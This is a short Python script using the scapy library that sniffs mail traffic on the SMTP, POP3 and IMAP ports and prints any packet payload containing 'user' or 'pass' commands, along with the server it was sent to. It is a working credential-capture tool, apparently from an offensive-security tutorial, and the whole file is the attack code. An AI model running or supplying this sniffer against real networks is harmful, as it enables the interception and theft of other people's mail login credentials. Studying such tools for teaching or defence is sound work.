#importing packages
from scapy.all import sniff

# packet callback 
def packet_callback(packet):
    # checking that our callback function when called has a data payload
    if packet['TCP'].payload:
        mail_packet = str(packet['TCP'].payload)

        # checking our payload contains typical user and pass mail commands
        if 'user' in mail_packet.lower() or 'pass' in mail_packet.lower():
            print('Server:%s'%packet['IP'].dst)
            print('%s'%packet['TCP'].payload) #If we detect an authentication string, we print out the server we are sending it to and the actual data bytes of the packet


# fire up our sniffer
try:
    sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",prn=packet_callback,store=0)
except Exception as e:
    print(e )